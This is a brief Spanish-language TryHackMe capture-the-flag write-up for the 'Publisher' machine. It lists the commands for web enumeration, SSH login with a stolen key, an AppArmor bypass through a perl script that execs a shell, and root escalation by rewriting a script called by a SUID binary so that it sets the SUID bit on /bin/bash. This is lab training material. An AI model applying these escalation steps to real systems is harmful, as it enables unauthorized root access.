# Publisher - TryHackMe

**IP:** 10.10.37.189

## Enumeración
```bash
gobuster dir -u http://10.10.37.189/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
ffuf -u "http://10.10.37.189/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc all -fs 0 -fc 404
```

## Acceso SSH
```bash
chmod 400 id_rsa
ssh -i id_rsa think@publisher
```

## Escalada de Privilegios
- Binario SUID: `/usr/sbin/run_container`
```bash
cd /usr/sbin/
python3 -m http.server 8989
wget http://10.10.37.189:8989/run_container
strings run_container
# -> revela /opt/run_container.sh
```

### Abuso de AppArmor
```bash
echo -e '#!/usr/bin/perl
exec "/bin/sh"' > /dev/shm/test.pl
chmod +x /dev/shm/test.pl
/dev/shm/test.pl
```

### Shell sin restricciones
```bash
echo '#!/bin/bash
chmod +s /bin/bash' > /opt/run_container.sh
/usr/sbin/run_container
/bin/bash -p
```
